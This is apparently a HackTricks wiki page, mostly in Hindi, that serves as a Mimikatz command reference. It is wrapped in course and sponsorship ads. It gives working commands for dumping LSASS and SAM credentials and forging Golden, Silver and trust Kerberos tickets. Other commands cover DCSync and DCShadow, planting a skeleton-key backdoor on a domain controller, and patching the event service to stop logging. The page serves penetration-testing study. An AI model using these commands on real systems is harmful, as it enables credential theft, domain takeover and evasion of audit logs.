# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!

## LM और Clear-Text मेमोरी में

Windows 8.1 और Windows Server 2012 R2 से आगे, क्रेडेंशियल चोरी के खिलाफ सुरक्षा के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM हैश और प्लेन-टेक्स्ट पासवर्ड** अब मेमोरी में नहीं रखे जाते हैं ताकि सुरक्षा बढ़ सके। एक विशेष रजिस्ट्री सेटिंग, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को `0` के DWORD मान के साथ कॉन्फ़िगर किया जाना चाहिए ताकि डाइजेस्ट प्रमाणीकरण को निष्क्रिय किया जा सके, यह सुनिश्चित करते हुए कि "क्लियर-टेक्स्ट" पासवर्ड LSASS में कैश नहीं होते हैं।

- **LSA सुरक्षा** को स्थानीय सुरक्षा प्राधिकरण (LSA) प्रक्रिया को अनधिकृत मेमोरी पढ़ने और कोड इंजेक्शन से बचाने के लिए पेश किया गया है। यह LSASS को एक सुरक्षित प्रक्रिया के रूप में चिह्नित करके प्राप्त किया जाता है। LSA सुरक्षा को सक्रिय करने में शामिल हैं:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ पर रजिस्ट्री को संशोधित करना, `RunAsPPL` को `dword:00000001` पर सेट करना।
2. एक समूह नीति वस्तु (GPO) को लागू करना जो प्रबंधित उपकरणों में इस रजिस्ट्री परिवर्तन को लागू करता है।

इन सुरक्षा उपायों के बावजूद, Mimikatz जैसे उपकरण LSA सुरक्षा को विशेष ड्राइवरों का उपयोग करके दरकिनार कर सकते हैं, हालांकि ऐसे कार्यों को घटना लॉग में रिकॉर्ड किया जाने की संभावना है।

### SeDebugPrivilege हटाने का प्रतिकार

प्रशासकों के पास आमतौर पर SeDebugPrivilege होता है, जो उन्हें कार्यक्रमों को डिबग करने की अनुमति देता है। इस विशेषाधिकार को अनधिकृत मेमोरी डंप को रोकने के लिए प्रतिबंधित किया जा सकता है, जो हमलावरों द्वारा मेमोरी से क्रेडेंशियल निकालने के लिए उपयोग की जाने वाली एक सामान्य तकनीक है। हालाँकि, इस विशेषाधिकार को हटाने के बावजूद, TrustedInstaller खाता अभी भी एक अनुकूलित सेवा कॉन्फ़िगरेशन का उपयोग करके मेमोरी डंप कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` मेमोरी को एक फ़ाइल में डंप करने की अनुमति देता है, जिसे फिर किसी अन्य सिस्टम पर क्रेडेंशियल्स निकालने के लिए विश्लेषण किया जा सकता है:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz में इवेंट लॉग छेड़छाड़ में दो मुख्य क्रियाएँ शामिल हैं: इवेंट लॉग को साफ करना और नए इवेंट्स के लॉगिंग को रोकने के लिए इवेंट सेवा को पैच करना। नीचे इन क्रियाओं को करने के लिए कमांड दिए गए हैं:

#### Clearing Event Logs

- **Command**: यह क्रिया इवेंट लॉग को हटाने के लिए है, जिससे दुर्भावनापूर्ण गतिविधियों को ट्रैक करना कठिन हो जाता है।
- Mimikatz अपने मानक दस्तावेज़ में सीधे इवेंट लॉग को उसके कमांड लाइन के माध्यम से साफ करने के लिए कोई सीधा कमांड प्रदान नहीं करता है। हालाँकि, इवेंट लॉग हेरफेर आमतौर पर Mimikatz के बाहर सिस्टम टूल या स्क्रिप्ट का उपयोग करके विशिष्ट लॉग को साफ करने में शामिल होता है (जैसे, PowerShell या Windows Event Viewer का उपयोग करना)।

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- यह प्रयोगात्मक कमांड इवेंट लॉगिंग सेवा के व्यवहार को संशोधित करने के लिए डिज़ाइन किया गया है, प्रभावी रूप से इसे नए इवेंट्स को रिकॉर्ड करने से रोकता है।
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` कमांड सुनिश्चित करता है कि Mimikatz आवश्यक विशेषाधिकारों के साथ सिस्टम सेवाओं को संशोधित करता है।
- `event::drop` कमांड फिर इवेंट लॉगिंग सेवा को पैच करता है।

### Kerberos Ticket Attacks

### Golden Ticket Creation

एक Golden Ticket डोमेन-व्यापी पहुंच अनुकरण की अनुमति देता है। मुख्य कमांड और पैरामीटर:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: डोमेन का नाम।
- `/sid`: डोमेन का सुरक्षा पहचानकर्ता (SID)।
- `/user`: अनुकरण करने के लिए उपयोगकर्ता नाम।
- `/krbtgt`: डोमेन के KDC सेवा खाते का NTLM हैश।
- `/ptt`: सीधे मेमोरी में टिकट को इंजेक्ट करता है।
- `/ticket`: बाद में उपयोग के लिए टिकट को सहेजता है।

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets विशिष्ट सेवाओं तक पहुँच प्रदान करते हैं। मुख्य कमांड और पैरामीटर:

- Command: Golden Ticket के समान लेकिन विशिष्ट सेवाओं को लक्षित करता है।
- Parameters:
- `/service`: लक्षित सेवा (जैसे, cifs, http)।
- अन्य पैरामीटर Golden Ticket के समान। 

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets का उपयोग डोमेन के बीच संसाधनों तक पहुँचने के लिए विश्वास संबंधों का लाभ उठाने के लिए किया जाता है। मुख्य कमांड और पैरामीटर:

- Command: Golden Ticket के समान लेकिन विश्वास संबंधों के लिए।
- Parameters:
- `/target`: लक्षित डोमेन का FQDN।
- `/rc4`: ट्रस्ट खाते के लिए NTLM हैश।

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### अतिरिक्त Kerberos कमांड

- **टिकटों की सूची**:
- कमांड: `kerberos::list`
- वर्तमान उपयोगकर्ता सत्र के लिए सभी Kerberos टिकटों की सूची बनाता है।

- **कैश पास करें**:
- कमांड: `kerberos::ptc`
- कैश फ़ाइलों से Kerberos टिकटों को इंजेक्ट करता है।
- उदाहरण: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **टिकट पास करें**:
- कमांड: `kerberos::ptt`
- किसी अन्य सत्र में Kerberos टिकट का उपयोग करने की अनुमति देता है।
- उदाहरण: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **टिकटों को हटाएं**:
- कमांड: `kerberos::purge`
- सत्र से सभी Kerberos टिकटों को साफ करता है।
- टिकट हेरफेर कमांड का उपयोग करने से पहले संघर्षों से बचने के लिए उपयोगी।

### सक्रिय निर्देशिका छेड़छाड़

- **DCShadow**: AD ऑब्जेक्ट हेरफेर के लिए एक मशीन को अस्थायी रूप से DC के रूप में कार्य करने के लिए बनाएं।
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: पासवर्ड डेटा का अनुरोध करने के लिए एक DC की नकल करें।
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### क्रेडेंशियल एक्सेस

- **LSADUMP::LSA**: LSA से क्रेडेंशियल निकालें।
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: एक कंप्यूटर खाते के पासवर्ड डेटा का उपयोग करके DC का अनुकरण करें।
- *NetSync के लिए मूल संदर्भ में कोई विशिष्ट कमांड प्रदान नहीं किया गया है।*

- **LSADUMP::SAM**: स्थानीय SAM डेटाबेस तक पहुंचें।
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: रजिस्ट्री में संग्रहीत रहस्यों को डिक्रिप्ट करें।
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: एक उपयोगकर्ता के लिए नया NTLM हैश सेट करें।
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: ट्रस्ट प्रमाणीकरण जानकारी प्राप्त करें।
- `mimikatz "lsadump::trust" exit`

### विविध

- **MISC::Skeleton**: DC पर LSASS में एक बैकडोर इंजेक्ट करें।
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### विशेषाधिकार वृद्धि

- **PRIVILEGE::Backup**: बैकअप अधिकार प्राप्त करें।
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: डिबग विशेषाधिकार प्राप्त करें।
- `mimikatz "privilege::debug" exit`

### क्रेडेंशियल डंपिंग

- **SEKURLSA::LogonPasswords**: लॉग इन उपयोगकर्ताओं के लिए क्रेडेंशियल दिखाएं।
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: मेमोरी से Kerberos टिकट निकालें।
- `mimikatz "sekurlsa::tickets /export" exit`

### सिड और टोकन हेरफेर

- **SID::add/modify**: SID और SIDHistory बदलें।
- जोड़ें: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- संशोधित करें: *मूल संदर्भ में संशोधन के लिए कोई विशिष्ट कमांड नहीं है।*

- **TOKEN::Elevate**: टोकनों का अनुकरण करें।
- `mimikatz "token::elevate /domainadmin" exit`

### टर्मिनल सेवाएँ

- **TS::MultiRDP**: कई RDP सत्रों की अनुमति दें।
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP सत्रों की सूची बनाएं।
- *मूल संदर्भ में TS::Sessions के लिए कोई विशिष्ट कमांड प्रदान नहीं किया गया है।*

### वॉल्ट

- Windows Vault से पासवर्ड निकालें।
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

अपने **मोबाइल सुरक्षा** में विशेषज्ञता बढ़ाएं 8kSec Academy के साथ। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) जांचें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर हमें **फॉलो** करें 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
